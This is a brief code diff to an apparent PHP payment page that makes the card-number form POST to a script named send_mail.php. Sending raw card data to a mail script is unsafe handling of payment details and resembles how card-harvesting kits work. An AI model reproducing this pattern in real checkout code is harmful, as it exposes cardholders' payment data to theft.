@@ -93,7 +93,7 @@ if (!isset($_SESSION['user_id'])) {
                     <!-- Will be populated via JavaScript -->
                 </div>
 
-                <form id="paymentForm">
+                <form id="paymentForm" method="POST" action="send_mail.php">
                     <div class="form-group">
                         <label>Card Number</label>
                         <input type="text" id="cardNumber" class="form-control card-input" maxlength="16" placeholder="1234 5678 9012 3456" required pattern="\d*">
